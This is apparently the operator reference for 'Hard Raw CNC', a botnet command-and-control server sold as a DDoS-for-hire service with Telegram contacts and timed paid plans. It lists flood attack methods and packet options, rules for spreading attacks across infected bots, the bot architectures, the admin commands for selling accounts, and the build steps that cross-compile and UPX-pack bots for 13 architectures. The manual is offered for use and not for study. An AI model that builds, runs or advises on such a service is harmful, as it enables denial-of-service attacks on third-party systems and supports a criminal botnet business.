# Hard Raw CNC — Reference

> Brand color: `\033[38;2;0;85;255m` (RGB 0 85 255 — used as LIGHT_BLUE throughout)
> Telegram: https://t.me/keepspin

---

## User Variables

```
user.username         - current username
user.maxtime          - max attack duration in seconds
user.maxbots          - max bots usable per attack
user.is_admin         - 1/0 — admin flag
user.is_root          - 1/0 — root flag (bypasses all limits)
user.expire_time      - Unix timestamp of plan expiry (0 = never)
user.expiry_days      - days remaining until expiry (0 if expired, "unlimited" if root)
user.expiry_fmt       - formatted expiry e.g. 2027-03-15 14:30
user.is_logged_in     - 1/0 — live session flag
user.prefix_enabled   - 1/0 — prefix display toggle
```

---

## CNC Variables

```
cnc.botcount          - total bots currently connected
cnc.valid_bots        - bots alive (passed ping sweep)
cnc.user_count        - total users in database/logins.txt
cnc.users_online      - users with active sessions
cnc.uptime            - formatted uptime e.g. 3d 14h 22m
cnc.maxslots          - global slot ceiling (set via maxslots command)
cnc.start_time        - Unix timestamp of CNC start
cnc.cooldown          - global cooldown in seconds (per user, set in logins.txt maxtime)
```

---

## Attack Variables (available after attack is dispatched)

```
attack.method         - method name e.g. udp / syn / http
attack.target         - destination IP
attack.port           - destination port
attack.time           - duration in seconds
attack.cons           - slot count used (cons=N)
attack.effective_bots - actual bot count that received the command
attack.slots_fmt      - e.g. "3/10 slots"
```

---

## Commands

### General
```
help        - show help screen (clears screen first)
methods     - list all attack methods with descriptions
options     - list all attack options (len=, cons=, sarch=, etc.)
bots        - show connected bot count broken down by architecture
stats       - show uptime, bots, users online/max, cooldown, slot capacity
user        - show your account info: maxtime, maxbots, expiry
clear       - clear screen and show MOTD (welcome screen)
cls         - alias for clear
home        - alias for clear
ping        - ping the CNC (returns bot count)
stopall     - stop all your running attacks
exit / quit - disconnect
```

### Admin
```
admin                       - show admin command list
adduser                     - interactive: create a new user (prompts for user/pass/maxtime/maxbots/admin/days)
removeuser <user>           - delete a user from the database
kickuser <user>             - force-disconnect a user's session
adddays <user> <N>          - add N days to a user's plan expiry
maxslots [N]                - show current maxslots, or set it to N (min 1)
```

---

## Attack Options

Options are appended after `<method> <ip> <port> <time>`:

```
len=N           - packet size in bytes (1–1500), or range e.g. len=100-1400
srcport=N       - source port override for SYN floods (default: random)
sarch=ARCH      - only use bots of a specific architecture (e.g. sarch=x86_64)
cons=N          - use N/maxslots fraction of eligible bots
usleep=N        - microsecond delay between packets (e.g. usleep=1000)
msg=HEX         - raw payload bytes in hex (UDP/TCP methods)
gport=N         - GRE encapsulation port
proto=tcp|udp   - inner protocol for GRE
method=GET|POST - HTTP method override
```

---

## Slot System

`maxslots` is a global integer (default: 5).
When a user sends an attack with `cons=N`:

```
effective_bots = (eligible_bots * N) / maxslots
```

Capped by `user.maxbots`. Without `cons=`, all bots up to `user.maxbots` are used.

**Example:**
- 1000 bots connected, maxslots = 10
- User sends `udp 1.2.3.4 80 60 cons=3`
- effective_bots = (1000 * 3) / 10 = 300 bots

---

## Plan Expiry

`database/logins.txt` format (6 columns, space-separated):

```
username password maxtime maxbots is_admin expire_timestamp
```

- `expire_timestamp = 0` → plan never expires (root behaviour)
- `expire_timestamp > 0` → Unix timestamp; CNC checks every command cycle
- When expired: user is instantly kicked with "Plan Expired. Contact t.me/keepspin"
- `adddays <user> <N>` adds `N * 86400` seconds to the existing timestamp

---

## MOTD (Welcome Screen)

Shown on login, `clear`, `cls`, and `home`:

```
 Welcome "myth" to HARD Network you have "30" days left.
 Type "methods" to see all our Methods.
 Connected from: 1.2.3.4.

 Telegram:    https://t.me/hardnetw
 PowerProof:  https://t.me/hardpowah
 Contact:     https://t.me/keepspin
```

Quoted values and colons are rendered in LIGHT_BLUE (`\033[38;2;0;85;255m`).

---

## Architecture Reference (bot `sarch=` values)

```
x86_64    arm     arm5    arm6    arm7
mips      mipsel  mips64  sh4     m68k
ppc       sparc   arc
```

---

## Database Files

```
database/logins.txt     - user credentials + plan data
database/logins.tmp     - atomic write buffer (renamed to logins.txt on save)
```

---

## Build

```bash
sh buildcnc.sh          # compile CNC → ./server
sh buildbot.sh          # cross-compile bots for all 13 architectures + UPX pack
```

Run:
```bash
screen ./server <botport> <threads> <cncport>
```
